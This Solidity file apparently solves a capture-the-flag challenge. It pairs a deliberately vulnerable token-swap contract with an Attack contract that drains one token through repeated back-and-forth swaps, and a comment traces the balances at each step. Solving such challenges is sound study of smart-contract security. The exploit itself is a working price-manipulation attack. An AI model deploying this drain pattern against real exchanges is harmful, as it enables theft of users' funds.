// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Challenge :- drain one of the tokens and get the price to zero

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }



  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}


////////////////////////////////////////////////////////
/////////////////ATTACK/////////////////////////////////
////////////////////////////////////////////////////////


contract Attack {

Dex dex;
IERC20 token1 ;
IERC20 token2;

constructor (Dex _dex) {
dex = _dex;
token1 = IERC20(dex.token1()); //0xb11A055603Ae8573aBf152ff028C5aBf39E37e9e
token2 = IERC20(dex.token2());//0xeCb903d2DDC02E30c3c8582f628B23568A40E1F3

}

    function attack () external {
        token1.transferFrom(msg.sender, address(this), token1.balanceOf(msg.sender));
        token2.transferFrom(msg.sender, address(this), token2.balanceOf(msg.sender));

        dex.approve(address(dex), type(uint).max);

        _swap(token1,token2);
        _swap(token2,token1);
        _swap(token1,token2);
        _swap(token2,token1);
        _swap(token1,token2);

        dex.swap(address(token2),address(token1), 45);

    }

    /*                                    balances
10 in -- 110 -- 90 --10 out        0  -- 20
24 out -- 86 -- 110 --20 in         24 -- 0
24 in -- 110 -- 80 --33 out         0 -- 33
40 out -- 70 -- 110 --30 in         40 -- 0
40 in -- 110 -- 50 --60 out        0 -- 60
110 out -- 110 -- 50 --50 in        0 -- 60


*/

    function _swap(IERC20 from,IERC20 to) internal {
        dex.swap(address(from),address(to),from.balanceOf(address(this)));
    }
}